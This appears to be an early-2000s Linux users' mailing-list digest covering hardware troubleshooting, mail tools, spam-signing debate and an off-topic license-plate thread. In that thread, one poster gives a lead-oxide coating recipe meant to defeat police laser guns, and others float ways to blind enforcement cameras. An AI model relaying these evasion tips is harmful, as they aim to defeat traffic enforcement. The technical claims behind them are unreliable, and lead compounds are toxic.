Yes, Slackware 9.0 and 9.1 come with Hotplug... enabled by default, if
it's installed.

A few folks have had to blacklist things because Hotplug can cause some
modules to load that shouldn't, leading to system lockups.

That's the type that is designed to last. It's the archival type.

If you've already given it your best shot, distance yourself.  You
don't want to be near that when (not if) they get badly compromised
and have to call up all their customers to let them know the info they
have is now public information.

Fetchmail is your friend.  It makes it so you can work with mail like
it's being received via SMTP.

iptables is your friend.  Also good in combination with adzapper and
squid to set up a transparent, caching and adzapping proxy.

Until a couple years ago, adzapper's license absolutely prohibited
using the software for censorship purposes.  It's now under the BSD
license, but the developer still tells you not to use it for
censorship.

As somebody recently pointed out somewhere... here, I think, but am not
totally sure... people sometimes don't want to wait five minutes for
their email to appear, they want to send emails back and forth like IMs.

There's software out there that captures the pop3 traffic (via some nice
iptables redirection rules) and fetches the email for the user and sends
it to them... transparently, similar to a transparent http proxy.

Yep...

I have a firewall script written up, modified from one a friend wrote
from scratch, with this feature available if anybody is interested.

Who said anything about using adzapper?  :-)

I like SquidGuard, myself.  It seems quick and is feature rich enough
for my tastes.  No restrictive licensing or icky requests from
developers.

I haven't a clue, I don't use Debian.  There's about nothing I really
like about it except that it does run (usually) Linux.

IIRC, OAV seemed a bit on the Redhat-centric side.  I'd be surprised if
there's still any development going on over there since ClamAV became
popular.

Greg, et al.:

  Perhaps the pci bus is inteferring with the usb. The USB core modules are
installed and working just fine. I set up the USB "thumb" (it's /dev/sdb1 on
my system) and can mount it on /mnt/fob with no problems.

> What modules?

  usbcore
  usb_hci
  usbserial
  and a bunch of others I don't remember. I'll finish this list in a few
days.

It helps to know the state calls them "registration plates."  The way
it reads to me is you get issued a certain number of plates, you have
to mount both where they're plainly visible (and not covered or
vandalized with shellac, or in the case of front plates, thrown on the
dashboard).  Use your head: Why bother having license plates if you're
going to hide them?

http://www.leg.state.or.us/ors/803.html


803.525 Number of plates issued. The Department of Transportation
    shall issue two registration plates for every vehicle that is
    registered by the department except as otherwise provided in this
    section. Upon renewal or when otherwise provided under ORS
    803.555, the department may issue stickers in lieu of or in
    addition to registration plates. The following shall be issued
    plates as described:

(1) Only one registration plate shall be issued for a moped,
    motorcycle, trailer, antique vehicle or vehicle of special
    interest registered by the department.

(2) Only one plate shall be issued for a camper that is
    registered. Stickers may be issued in lieu of a plate.

803.540 Failure to display plates; exceptions; penalty. (1) A person
    commits the offense of failure to display registration plates if
    the person operates, on the highways of this state, any vehicle or
    camper that has been assigned registration plates by this state
    and the registration plates assigned to the vehicle or camper are
    displayed in a manner that violates any of the following:

(a) The plate must be displayed on the rear of the vehicle, if only
    one plate is required.

(b) Plates must be displayed on the front and rear of the vehicle if
    two plates are required.

(c) The plates must be in plain view and so as to be read easily by
    the public.

(d) The plate must not be any plate that does not entitle the holder
    thereof to operate the vehicle upon the highways.

(2) A person is not in violation of this section if the person is
    operating a vehicle or camper under and in accordance with the
    requirements for any of the following:

(a) A temporary application permit issued under ORS 803.615.

(b) An agent temporary registration permit issued under ORS 803.625.

(c) Provisions established under ORS 826.007, 826.009 or 826.011 for
    the display of registration plates or other evidence of
    registration on vehicles that are proportionally registered under
    ORS 826.009 or 826.011.

(3) The offense described in this section, failure to display
    registration plates, is a Class D traffic violation. [1983 c.338
    261; 1985 c.668 13; 1989 c.43 28; 1995 c.383 -6]


Also, what legitimate reason is there not to have a front license
plate?  Makes your vehicle easier to identify from the front if it's
stolen and/or involved in a crime, so what drawbacks could there
possibly be by having it there?

Yes.  It's called fetchmail.

BTW-Many mainboards, and Intel boards in particular, have the ability
to emergency flash a disk properly constructed and with the right
jumpers set. It will be detailed in your documentation, if it is
available.

I bought a Siig USB2 board from Fry's once - never did get it to work with
Linux - in fact, it locked up the system.  I don't know whether that was
(1) Fry's repackaged defective junk, (2) Siig incompatability, (3) error
between keyboard and chair.  But if a smart fellow like you can't get
your USB adapter running with the help of all the smart people here, it
may be problem (1) or (2) above.

Note that some cheaper USB controllers are designed to load their firmware
over the USB bus (and the more expensive ones load their firmware the same
way and put it in NVRam) .  So it may be that the unit will never work 
unless it talks to a fancy driver available only for windoze.

I hope that is not too discouraging - you have the thing working with
just a bit more work - but if you keep having troubles you may want to
try the thing with a windoze box;  if it doesn't work there, you've
been Fry'd.

If you happen to be a speeder who believes he is above the law so long
as he can get away with it, having a front license plate makes it much
easier for the police to identify you as speeding.  Laser speed guns
work quite well on front plates.  Photo radar, AFAIK, only takes a
picture of the front of your car.

Photo radar only takes a picture of the back of your car.  Photo
stoplights get you from both sides.

Fetchmail may be able to do this, but it's the first I've heard of it
having this ability... you're going to make me dig out the name and URL
now.  :-)

It is pop3vscan I was thinking of.  http://pop3vscan.sourceforge.net/

I've been using F-Prot for my (private) server.  I keep meaning to grab
ClamAV and try it out - a daemonized scanner would cut down on the CPU
cycles wasted on the thing, I think/hope.

Maybe I'll actually get around to that in the next few days.  :-)

  It was the only USB->serial adapter they had. When I return and spend more
time on it I'll have a better idea. I can capture about 200 images on the
smartmedia chips I have for the camera so it's probably not an issue, but I
like the idea of being able to upload the images to the notebook for safer
keeping.

  As I know nothing about USB (the "thumb" I bought was the first USB device
and my workstations are too old to have them) my naivety may have cost me
$30 plus the time and gas. When I get back I'll check ENU and see what they
have.

  No winduhs boxes here. It ain't an option. Besides, working on winduhs
means nothing to me, working on linux does. :-)

Er, if a spammer can pump out 100,000 ads in an hour, but it takes days
to identify it, then "it works" doesn't mean much overall.

Two hours for a process which may take two days?  Sounds like a lot of
inconvenience just to break off a little corner of spam traffic, doesn't
it?

Why is that?  I thought only the body of the message is signed.

Not sure what this means, sorry.  They'll be creating arbitrary keys
just to get through filters.  The contact method won't change.

How?  A single virus can be written to gen' keys and send spam from a
compromised host.

Great theory, like charging everyone a fraction of a penny for each
email sent.  Thing is, spam is sent anonymously from hijacked servers. 
(RATs are generating a third of it, for example.)  So spammers won't
really feel it.

Haven't had any user complaints.  I don't run Windows, so it's only of

Those are mips based boxen IIRC. IMO, it wont be easy to get another
distro on it. Either booting from the network or setting up a bootable
partition.

No, Qube2's and RaQ2's were MIPS. At 3, they went to ia32.

If you apply thin layer of the transparent acrylic enamel mixed with
Pb2O3 or Pb3O4 onto your license plate, it will reliably dissipate 
laser radar beam in a pretty wide range. So you won't get a ticket. 
This coated license plate looks like a regular one. 
The proportion of this crystallic Pb salt should be about 25-30%.
There are at least to methods how to blind photo cameras when you go on the 
red light.

You're not allowed to modify your plate or add your own coating, it
interferes with the reflectiveness of the plate making it difficult to
read in headlights.

Again, if you're going to make your plates harder to read, why bother
putting them on your car?

A fun thing to consider:

Does the law clearly forbid 'conditioning the atmosphere' in the vicinity of 
the plate so as to render the plate illegible? In other words, although there 
is no physical object between the plate and the viewer, a small array of 
Tesla coils around the periphery of the plate could draw arcs across the 
viewing area at a distance from the plate and prevent the numbers from being 
read or photographed. Perhaps plasma channels may not be covered or defined 
sufficiently by the words of the law. If that is the case, then a sort of 
instant-on mini lightning generator (think Spencer's) might work for coasting 
through those darn photo-intersenctions...

I feel for you , Ed. I had a customer connected to a LAN in an insurance
office where there was NOTHING installed, no firewall, hardware or
otherwise and the McAffee that had expired years ago.

I wound up disconnecting the customer and walking away. I could not bear
the thought of 5,600 people's home addresses, vehicle VINs, SSANs,
incomes and bank account information floating around, free form on the
web.

I tried to give them a clue by presenting a nice letter as I left their
circle of vendors, but they only stuck their heads in the sand further.
Hopefully they have since found someone whose advice they can trust more
than mine.

People are paranoid that we're trying to over-protect them for our
personal gain. They think it's being over-sold, like too big an air
conditioner or an extended warranty that won't fix the stuff they need.
I do not know how to bridge that gap, so I have to leave them to their
silliness.

Run, man. run. In the end you can be proud of what you do. there are
just some people out there that don't want what you do. For them,
there's an MCSE.

: going to hide them?

A fun thing to consider:

Does the law clearly forbid 'conditioning the atmosphere' in the
vicinity of
the plate so as to render the plate illegible? In other words,
although there
is no physical object between the plate and the viewer, a small array
of
Tesla coils around the periphery of the plate could draw arcs across
the
viewing area at a distance from the plate and prevent the numbers from
being
read or photographed. Perhaps plasma channels may not be covered or
defined
sufficiently by the words of the law. If that is the case, then a sort
of
instant-on mini lightning generator (think Spencer's) might work for
coasting
through those darn photo-intersenctions...

So you want to help people REDUCE their liability for operating a deadly
device in an even less safe manner?

Me, I'm stunned that private motor vehicles of the scale around today are
LEGAL, let alone considered an inalienable right by some.

Every car is a killing machine.  You should treat it as such.

Under the provisions of the GPL, sellers of media can
charge a "reasonable" amount for material costs. The
tendency, however, is for distributions not to be
provided as .iso's, so that people will buy the retail
product which includes "support," often very
inadequate, due to the inconvenience associated with
installing individual packages.

As a safety measure, SuSE provides very little
downloadable documentation. Red Hat apparently
restricts the use of its name, so that disks of its
software provided by third parties are marketed as
"Linux 9.0," or whatever.

You are failing to understand:  "When sent", and even "when delivered"
is not the same as "when read/detected."  Not everyone reads all the
email within minutes of it being sent.  As stated below if the time
period is 2 hours, that may be faster than the email can be delivered.

Um, are you purposely taking things out of context, or am I not clear.

The above "days" was a maximum.  The 2 hours listed here is my guess as
to as to what the average peak time was (in other words, the best time
to hold email from a signed unknown, so that it is most likely that the
unknown spam account has been detected).

If I am not clear, I am sorry,  otherwise please stop juxtaposing unlike
values.

Um, I am confused.  Yes, only the body of the email is signed, but it is
still a real value to run the key creation, signature calculation, and
signature attachment.

If you do not think so please test this.

Send 5 million emails on a LAN (a virtual catch all account should do
it).  It is all the same exact note, just the TO: field changes.

Now run the process that creates unique senders, keys, and signatures
for each of the mails.  See if it is negligible.

Many of the Nigerian scams use the email for the return address.  Access
to those emails can be monitored but traces are easier to cleanse.  If a
key in involved, that key must be kept around at the scammers end (or
access to it).

And that process leaves a ton of information.  In this case it would
merely prove that the virus used that machine to generate the keys. 
While that makes for a great story, lots of spam is still generated on
within the spammers' machines.

Umm, you are taking the line out of context.  The point was to make each
email have a resource use that needs real time (milliseconds).  You and
I will not notice it, but even a virus will be impacted (as per the 5
million email examples above).  A monetary tax makes no sense since it
will not be billed to the right person or entity (though in general it
might make everyone must tighter about security, but that won't happen
for a while).

Thanks to everyone that responded. While I know I
should walk away, I'd feel guilty about abandoning
those people whose private information is at risk.

I think there are many people and companies who use
Windows and have similar attitudes about security and
privacy and it would be nice if there was something we
(the community) could do to educate them.

Just back from vacation, so I may have missed relevant parts of the thread,
but here goes anyway.

Are you using random data?  Is ssh configured to do compression?  I think
that ssh could be significantly faster if the data is compressable.

Hmm.  I don't think that's it.  The files I was copying around were (I
think) tarballs, either gzip'd or bz2zip'd, so even if I had ssh doing
compression, the file wasn't compressible.

I just tried again using gcc-3.3.tar.bz2.  With scp I got a vmstat 1

The SuSE disks contain non-GPL code, so as a general statement in this
instance, it might not be applicable.

OK, so this one I could argue. By definition, a "clear plastic license
cover" does not alter the appearence of a license plate. Of course, this
also behooves the owner to clean the cover... But I see a lot of dirty
plates that are unreadable as well. Maybe I could design a program in
linux to clean my plates automatically? (

A smoke colored cover would alter it, so I can see where this is illegal.

Ack, talk about really obscure language. I understand it, but wouldn't
it have been easier to say, "... plates shall be affixed to the front
and rear of the vehicle..."??

In the case of certain cars, it spoils the appearence of the car.
Specifically, Corvettes, Camaros and many other sporty type cars are not
designed to integrate the plate into their design. 

In this case, it's nothing of the sort, as a friend was cited for having
his plate in the window, since the bumper mount was striped and would
not hold it. He asked me the question a few weeks ago, and I didn't find
the answer.

Message-ID: <20031210184807.17072.qmail@web9604.mail.yahoo.com>

I'm having a problem I don't understand very well, and
any insight would be appreciated. I am using an add-on
drive controller (Promise Ultra100 TX2). Although
Linux is said to support it, I am beginning to doubt
it. At the same time, the controller is needed to
support the large drive I am now using.

The installation of Red Hat and SuSE cannot be
completed at all. In both cases, about halfway through
it says something about the media being defective, and
you can reboot now. It worked before the installation
of the new controller, though.

As I mentioned, Mandrake really comes close. About the
only problem is that the CD drives, connected to the
onboard controller, are not set up properly, and there
are no block devices that correspond to them
(/dev/cdrom, /dev/scd0, etc.).

What do you do about that? One possibility I can think
of is to disconnect the power cables to the CD drives
during the installation and to install either from a
hard disk partition, or from a removable CD drive. I
have room to copy the installation disks to a hard
disk partition, though I don't know how to do it. As
to a removable CD drive, it wouldn't be bootable, so
that would entail making a boot floppy. (Apparently
that is pretty easy.)

Maybe kernel parameters would offer an easier
solution. I don't think the kernel is able to
distinguish between the two controllers properly. And
no, when I posted this to the Mandrake mailing list, I
didn't get an answer.

No, I understand the process, I think.  I'm just saying that where it
takes more than a day for spammers' certificates to be flagged as evil,
spam will still get through to the recipient, since most people check
their email at least once a day.

> If I am not clear, I am sorry,  otherwise please stop juxtaposing
> unlike values.

I'm not sure I did.  You said at first that detection would take
"minutes to days".  If so, then a two-hour wait time would only catch a
small percentage of spam (based on a linear proportion of detection
times), correct?  Unless you believe the majority of spam will be caught
within two hours, and that only a few will take as long as days. 
Obviously, neither of us has graphed this prediction.  The point is,
unless that two-hour wait is ample for a large majority of spam, it is a
high price to pay, because most people want speedy delivery, as someone
else mentioned.  So it does matter how long detection takes.

Remember, we are up against a great ROE for spammers.  That's why it's
such a big goddamn problem.  If we only try to further inconvenience
them, they'll just get better at what they do.

Yes, sir, that would require more processing.  My question, why should
the spammer need to create a different key for each email?  I see that
it would ensure delivery (not accounting for traditional spam filters)
and would make that two-hour wait a moot point, but if it really makes
it so difficult to spam in bulk, then couldn't the spammer just use the
same key for a number of emails?

This is a process of which I lack understanding.  In my mind, the
spammer will generate arbitrary keys just to get emails through to the
consumer.  Nobody knows anything about those keys, thus they are just as
useless as a return address for finding out who sent the spam.  Explain
how the key is involved after the email is received.

Okay, but even so, how does signing emails with unknown keys leave any
forensics?  Are you thinking spammers' boxes could be seized and the
keys found on them?  Not likely.

(Then again, if it does serve to incriminate the sending machines, that
would only mean rooted and RAT-infested machines would become the
primary MO.  That doesn't sound very nice.)

Agreed.  But you'll have to quantify this, to make a real argument. 
First, we have to decide how much spam is sent from spammers' own
machines versus how much is sent from hacked boxen--how much processing
power have the spammers at their disposal, considering the rate at which
networks can actually send email.  If as you say a separate key has to
be created for every email (of which I remain dubious), then the flow of
spam may indeed be reduced.  But will it make a difference over time? 
Considering Moore's Law is not yet in any danger, I have to wonder.

But if you think your solution is worthwhile, I'd be interested in
reading a complete description.

It does support it, but can be difficult to install to.

Do you have a small drive that you can use to install the OS?  When you
get the big drive working, this will most likely require some sort of
kernel upgrade.  When the big drive is working, partition it and copy a
tarball of the file system from the small drive to the large drive.
Untar and start playing with your boot loader to get the of board
controller to boot, you can always go back to the small drive if you
need to.

These are just mis-labeled drives, the onboard controller drives are
probably labeled /dev/hde, /dev/hdf, /dev/hdg and /dev/hdh.  The
symlinks and kernel parameters probably need to be corrected.

My guess is that the kernel knows what it is doing, unless your
motherboard is assigning the IRQ of the controller card to another
device as well.  The startup log should shed a lot of light on what the
devices are being called, and the IRQ's that are being assigned.

Good Luck,

Perhaps the easiest first thing to do would be to use
"expert" installation mode to turn off automatic
hardware detection. I didn't know about this option
earlier. If it doesn't work, or I can't provide the
needed information, I can proceed with readjusting the
hardware.

Such problems are apparently not unknown in Mandrake's
support forums. This guy has a bear by the tail:

"Faut-il cr?er des partitions sur les Drives
(hd1a,b,c,d) ou sur RAID0/P0 et RAID0/P1 qui sont

The public should not have to accomodate the whims of designers.

Nothing of what sort?

Windows have coatings to prevent glare and UV penetration.  License plates
are designed specifically to reflect as much of the spectrum as possible
to allow for many read methods.  Clear covers and windows both limit the
"visibility" of the plate even if your feeble human eyes cannot discern
the difference.

> He asked me the question a few weeks ago, and I didn't find the answer.

Which question?  Your writing is very unclear.

You CAN educate them... and if they don't listen, you should go public as
much as possible.  Let them know your intentions and perhaps speak with an
attorney if you're so worried about it, but you can talk to their
customers and the public about their unsafe practices if they refuse to
listen to reason.

I think it's pretty clear that you know what the right thing to do might
be, but you're looking for something easier.

Most of the time, the right thing is the absolutely hardest thing.

Well, that's why we don't have train tracks criss-crossing our cities.

We give up our right to free mobility to the train tracks because it's a
small price to pay for the benefits of mass transit.

The price of staying out of the way of automobile paths is MUCH higher and
the benefits are very few if you're not exceptionally infirm.

I have one of these controllers in my fileserver.  I have had zero
problems.  The system is built from scratch and I did nothing unusual.

[...]

I have the same controller running on my RH7.3 system. I had a similar
problem installing RH7.2 since it had the 2.4.2 kernel - which had no
support for ATA100. The install would get most of the way through and
then spontaneously reboot. Once I figured out the problem, I had to
finagle the bagel to load it on my Maxtor 40GB by attaching the drive to
the onboard controller to install RH7.2, then making and booting into
2.4.17 on my RH7.2 system and finally connecting the drive to the
Promise controller. After that I needed to adjust the swap entry in
/etc/fstab and reboot and I was good to go (I use grub as a boot
manager). I've since upgraded to RH7.3.

What kernel are you running?

I should have specified that I wish to view a webcam that is on Yahoo,
not on a webpage. Neither Gaim nor Yahoo Messenger for LInux seems to
support webcams, is there a way around this?

If not underused for freight.  Really clueless to use semis to take
goods between cities served by the railroads, since the railroads will
get the job done faster and more reliably.

Though motorists need to remember that bicycles, pedestrians,
equestrians, rapid transit, emergency vehicles and trains have right
of way over motorists (not in that order, though), and being able to
register your vehicle and obtain a driver's license is *not* a right
but a (far too infrequently) revokable privilege.

But it obscures the plate, since any light source will glare on it.

But that's not always the case.  For most vehicles, it is.  But
tractors don't get plates, semi trucks only get a front plate,
trailers and campers only get a back plate...

Because they're tracks to not literally criss-cross the city... certainly
not to the extent that the automobile tracks do.

It takes you 45 minutes to walk between less than ten rail lines, whereas
a less than 10 minutes' walk can cross 30 different automobile "tracks".

What you give up in mobility you more than make up in transportation
benefits.  Automobiles restrict mobility massively for very little benefit
to most people in most situations.

Yes.  Less maintenance, more reliability, etc.  I didn't mean "mass
transit" to only imply human transportation.

What protocol is used for transmitting the images?  If it ain't HTTP, it
ain't a webcam.  If it is HTTP, use a web browser.

True enough.  They once did, though, in most American cities.  Auto,
tire and oil industries did a pretty damn good job of making sure
streetcars and other forms of mass transit were scrapped to
ineffectiveness in the 1930s on a fairly grand scale.  Had they failed
in their efforts, LA would probably be livable (if you ignore the fact
it's inhabited almost exclusively by shallow morons who should have no
business having a driver's license or, for that matter, ability to
breathe to begin with).

Exactly.  Even though it's not like we have streetcars on nearly every
street like we used to, TriMet, a bicycle, and a cargo trailer is
everything you'll ever need to get around if you're within two miles
of a transit stop.  Ditch the bike and trailer and replace with a
granny cart if you're within a half mile of transit.  Everybody else
is making up excuses for overbooking their schedule or trying to
justify living centrally located to nothing.

Yahoo has an IM. Presumably it has videoconferencing integrated much
like MSN used to have NetMeeting (and is moving to a new protocol).

I, for one, would like to know if my information were vunerable.  ie, one of

No continuing to work without comment is far a more "selfish,
irresponsible approach," but even that would not shock me.

Only if they want to be educated.

That may not be legal, ethical, or correct.  There may be more damage by
going public to all parties.  If telling the world a bank has no
security, causes 100,000 people to lose all of their money, is that the
best thing?  Do not assume that the people wopuld withdraw their money
before the criminals could.  Same goes for public companies and stock
prices.

It is never cut and dry in these cases.  The best outcome is for the
management to change priorities.  Walking away may at least not make the
situation worse (through your actions).

BTW there are ways of going public, that are not so public, and may be
legal and ethical.  Reporting this to private entities that are covered
under any NDA would be good.  In the case of the public company, telling
the Board of Directors, or Investors, would not be unethical.

I would argue the right thing may seem harder, but is often the easiest
in the long run.  One way of making A or B decisions is to ask "in 10
years which would I prefer that I had made.

Jeme may be many things, but I would not use "selfish and irresponsible"
at the top of the list.

This is a personal attack on Jeme and completely uncalled for.  Jeme
made a point about a situational choice, not a person.  You turned that
into a personal attack.

Please do not do that.

Subject: [PLUG] GNU hats make good advertising!
Message-ID: <867k13ly7s.fsf@coulee.tdb.com>

I was in the grocery store this evening, and as I walked up to the
checkout line, the bagger asks me what my hat means, the baseball cap
with the big yellow GNU on it.  I give him my standard reply, which is
that it's a free software project.  He's never heard of that but asks
if it is related to the animal, and I say that they use the animal as
a kind of mascot.  And then I mention the bit about GNU not actually
being pronounced that way, that apparently in native language it has a
click in it like the Bushmen language has.  Then I turn around and the
checker tells me that he's got Debian GNU/Linux CD's at home but
couldn't install in on his laptop.  Something about the winmodem he
thinks.  After a little diagnosis of what might be thwarting his
attempts, I realize that I'm not going to solve the problem in the
checkout line, and so I tell him about the clinic and tell him where
it is and when it meets.  He writes it all down.

Seems like pretty good market penetration when the checker at the
grocery store is interested in running a GNU system.  It's not just
for hackers anymore.

Well, I'm glad to hear that. In response to another
reply to my message, the kernel is 2.4.21-0.13mdk,
pretty new.

My presenting problem was that I couldn't get any
response from the CD drives after installation. These
are connected to the onboard controller and the large
hard drive and a smaller one are connected to the
Promise controller. I conjectured that having two
controllers with devices connected to each might have
complicated the installation. Now I think I'll try it
again.

Using "linux noauto" disables automatic detection. I
haven't done it that way before, but it is often
essential for owners of notebook computers and there
is thus information about it on the Web.

If your device is actually installed but is not where
you expect to find it, I understand that 

>cfdisk -P s /dev/xxx will list the possibilities.

By the way, I don't know all the options that can be
used with "linux noauto." Is there a list of these anywhere?

The vast majority of train tracks are NOT for mass transit.

I dunno. I've never had a problem staying out of the way of automobiles.
But then, I know that if that car hits me, I lose. Even if the law is on
my side.

I swear that some folks were just never told that cars are heavier and
harder than people, and to not play on train tracks or in streets. Since
I moved to Portland, there have been several people killed by Max
trains. Very few, if any, of these were the fault of the train. 

I don't see cars playing football in parks, so why should people play
football in the street?

Subject: [PLUG] minicom scripting?
Message-ID: <863cbrlxr7.fsf@coulee.tdb.com>

A neighbor asked me to help him push a text file from Linux over a
serial port to a 3D milling machine.  First I try to sell him on using
the print spooler (which I think would be kind of cool).  No dice,
besides he's still using sneaker net.  So I fire up minicom, set the
comm parameters and save it to a special configuration.  He just wants
to send a file as ASCII, so in conventional-interface minicom there is
a lot clicky-click to get to the right spot to enter the filename.
I'd like to script that for him.  I noticed that minicom has some
scripting capability, but it wasn't documented in the man page.  Does
anyone know how to script sending a file in minicom, or a more direct
way to stuff a file out the serial port (at 2400 baud 7E1)?

Thanks.

This was explained further down, but you snipped it:

        The above "days" was a maximum.  The 2 hours listed here is my
        guess as to as to what the average peak time was (in other
        words, the best time to hold email from a signed unknown, so
        that it is most likely that the unknown spam account has been
        detected).
        
> since most people check

I am not sure this is true.  For power users yes.  For business users
yes.  But those people can have spam filters that are pretty good and
responsive already.

I bet "most" people check their mail a lot less frequently then you
would expect.  Remember most roads (> 50%) in the United States are
still dirt.....  Personal experience and statistics do not match.

But even once a day is fine since I am guessing at 2 hours.

I do not think a majority require speedy delivery.  When I leave the
tech, and medium tech business world, and talk to relatives, car part
manufacturers, and the like.  Their use and expectations of email are
far less.

Also this would only be delivery from previously unknown senders.  Known
senders could speed through the system.  Most email exchanges would be
easy.

Um read back the emails.  You were commenting on this specific scenario.

The alternative, that each "batch" of spam has one key, means that whole
batch can be identified by the razor-pgp to the sender key.  This is
very very different than the current scoring.

Consider that now a filter for me, if it sees the word "Viagra" can be
%95 sure its spam, but if I work at clinic, that is not as true.  But if
someone on my magic razor-pgp reported this sender key as spam, than it
would be 100% sure when my clinic guy got the mail, or the clinic guy
opened it.

So identifying SPAM has just gotten easier due to sender (which is so
1996).

Keith needs to post the Mugu baiting site.  Believe it or not, most of
the return emails to the Nigerian scams are monitored by the sender and
you can start a conversation up with them.  Try it, its fun!

In order for that to work int he signed email world, they would have to
maintain the sender key for future emails.

Broadcast email with returns to fake email would not work of course
(that was mentioned prior).

Where ever the spam is sent will have more "stuff" done on the machine. 
Calculating keys leaves lots of traces in swap, temp files, etc.  More
than sending emails.

And you plan on never leaving the city. On the other hand, I have family
all up and down the west coast, and I'd like to see them on occasion.
Everywhere from Bellingham to LA. 

Riding the bus or train to another city is both more expensive (in MY 
pocketbook, Jeme!) and slower. I can get to Eugene (for example) in 1.5
hours. 

The bus takes about 2.5 hours, and costs $28.50, round trip. 

The train takes about 2.5 hours, and costs $40.00, round trip.

I can fill my tank for $28.00, drive there and back, and have gas left
for the weeks worth of driving to and from the Max station.

So just where are all these people supposed to live? If everyone lives
in the city, then you have a more crowded city. The city isn't designed
to hold all the people that live in the 'burbs.

And I'll reply with the fact the mass transit is subsidized just as

Subject: [PLUG] scsi drive speed
Message-ID: <1071123947.11208.54.camel@localhost>

I've got an old Adaptec AHA 2940UW card and a Seagate 50G SCSI-3 Drive
(possibly 7200 rpm, don't remember model) and I've got the drive on the
very last connection of a U160-rated cable. I'm getting some odd numbers
on hdparm.

hdparm -t gives 2.66MB/s (read from drive)
hdparm -T gives 163MB/s (read from cache)

I'm really confused. A UW card should be able to run up to 40MB/s, so it
seems rather odd that it would be able to give me reads, even from
cache, of 163MB/s (we're talking drive cache, right? the card doesn't
cache stuff, I don't think), and also odd that the drive would only run
at 2.66 MB/s. Especially because I've got 5400 rpm ide drives running in
the high tens.

Anybody got any ideas? 

I'm using the aic7xxx driver on the 2.6 kernels. Oh, and the only other
piece of the setup I didn't mention is a brand-X converter to convert
the 68 pin SCSI cable to the SCA (or SCA-2, don't remember) 80-pin
connection.

Another option I would suggest is kermit.  Has a very extensible language

The bill was introduced in July by Roslyn Dundas, the member for

The bill says that public bodies should, as far as practicable, consider
the use of open source software when procuring computer software.

man hdparm

DESCRIPTION
       hdparm  provides  a command line interface to various hard
       disk ioctls supported by the stock  Linux  ATA/IDE  device
       driver  subsystem.   Some  options may work correctly only
       with the latest kernels.  For best results, compile hdparm
       with the include files from the latest kernel source code.


bonnie, bonnie++, tiobench, or tbench, might be better tests to run

In relation to the number of automobile "tracks", no... almost none.  It
would be extremely generous to give it a 50:1 ratio.

What kind of massless trains do you think we have in this city?

As I wrote earlier, I wasn't limiting that mass transit to human
transportation.

Well, you're not going out enough.  They're freakin' everywhere.  They're
given a huge percentage of the public space in almost every region.  And
in my neighborhood, MOST of that space is used for automobile storage...
fully subsidized by the public.

Trains don't take fault... they're just metal and plastic after all.

The responsibility is absolutely on the part of the one wielding the
deadly weapon.

Uh huh... and how about if we compare the land area of neighborhood parks
to neighborhood streets?  And what about the budget of the parks
department versus just the road maintenance division of the transportation
department?  You'd think that the government exists to serve the
automobile industry more than the human beings.

That's why you rent a car.  It's MUCH cheaper for even monthly trips out
of town and I'll bet you don't get out that often.

Uh huh... and then you've got to fill it three or four mor times before
you leave town again... then you've got to pay insurance and maintenance
and then there's the massive public subsidies...  The list goes on.

Cities are constantly changing shape and scope.  They're dynamic
structures.  No, you couldn't have everyone in the 'burbs move into the
city TOMORROW, but that's not going to happen anyway.  Better to move them
in one household at a time.

Identifying a vehicle at speed is how we can protect people from rampaging
motorists and at-risk behavior.  A license plate identification has taken

What I'd like to see is a technical pronunciation key.  My webster's says to 
pronounce the animal (using chars I can't type here) "new".  I always 
pronounce the software project as "gnew".  Where does RMS put the clicks and 
what do they sound like?

A long time ago I said "line-ux" just because I preferred the long vowel. 
But when I met other users face-to-face I adopted the correct form "lin-ux".

It's funny how folks develop their own pronunciations when not exposed to 
the words in the wild.  The other day a friend, who is well educated, was 
speaking of a sickly person and meant to say "invalid" but said "in valid" 
(as in not legitimate).

Please don't take these OT conservations to plug-talk. plug-talk is only

easier to move Linux/ BSD/ Unix posters to plug-talk than move the

RMS doesn't put in the click and never has.  He learned of the click much
later.  He has always pronounced it G'NU.  The english word is pronounced
NU.  The original word would be written today as !NU where the !
represents the tongue click.  Very often you'll find the imperialists
would just throw any old letter in where there was a sound they didn't
normally use in their native language.  That's one of the reasons nearly
everything in Africa and Southeast Asia has had to change its name in the
past forty years.

I think it's because of the english pronunciation of Linus (as in Pauling
and Van Pelt).

I'm not sure where you get the "correct".

I mean, Linus isn't "leenuss" as much as he's "leenoos" and HE pronounces
it "leenooks".  Whereas most folks I know say something between "linnuks"
and "linooks".

I had a friend who said "mizl'd" to describe the act of deliberately
taking one astray in thought or action.  So you could misle somebody and
they would be misled.  Get it?

Figure it's fair to take the first part of his name as he pronounces it and 
tack on the "nux" from the California "Unix".  As you said: "leenooks".  But 
it's just too foreign to my tongue.  I think lazy americans say "lynn-ux" 
and that, for better or worse, usually wins.

There's no handshaking this way, right?  You'd never know if the other 
machine was even awake before you crammed the file up its hoohaw.

I have seen the print spool used in such a way and even posted the story to 
plug a while back.  Can't seem to find it at the moment.

Right. So if the device uses hardware handshaking we should  add crtscts to get 

stty crtscts cs7 -parodd 2400 < /dev/ttyS0

Actually, that style would be nice, but I am not up on the details of
setting the comm parameters.

Yeah, he needs hardward handshaking.  You happen to know the stty
command for that?

I believe that Russ was also responsible for bringing this

_remotely_ relate to Linux, Unix, free software again?).  There are
readily available fora for this topic, more than willing to plumb the
very depths of the subject.  See e.g.: or.politics.

You just don't get it, do you?!?
You think people should be allowed to have choices like that?
Well, maybe that was OK in some other era, when if you didn't like your 
situation, you were free to WALK along the big Blue River, cross over to the 
Nothe Platte, then try to make it over South Pass, Wyo, up to Pocatello, ID, 
(be sure to stop at Soda Springs because they didn't have Coca Cola in the 
day!) then cross the interminally boring Snake River canyon, and almost 
finally, NOT lose everything you brought with you trundling down Emmigrant 
Pass - and finally doing your best down the Columbia river rapids.

No. Think Central Planning, Central Planning, Central Planning. People need to 
live and work together, as tightly clustered as possible. That every one 
person's ineptitude or misery becomes a community event, you see. Also, 
everyone is supposed to live in the same housing density, so we all have the 
same sorts of experiences growing up. Everyone is supposed to participate in 
public community life, and everone must work to support public projects such 
as public trans, the library, and public radio. These are a mandatory orders 
from your benevolent People's Government. If you go off on your own, we will 
have to send some friends over to check up on you, because that's anti-social 
and dangerous to public policy, and in any case serving and living amongst 
one's People is a pleasure to any correct-thinking Citizen. You may need 
re-education, or else you might even be charged as an Enemy of the People 
under Article 58! (http://www.cyberussr.com/rus/uk58-e.html)

I upgraded from RH7.3 to RH9 and it zapped my sound.  When I shutdown 
the system now, I get a message that says it could not find modules 
sound-slot-0 and sound-service-0.0.  I also get a message after logging

sound-slot and sound-service but I don't think they exist.  I read the 
sound HOWTO and it is telling me to run pnpdump and isapnp and look in 
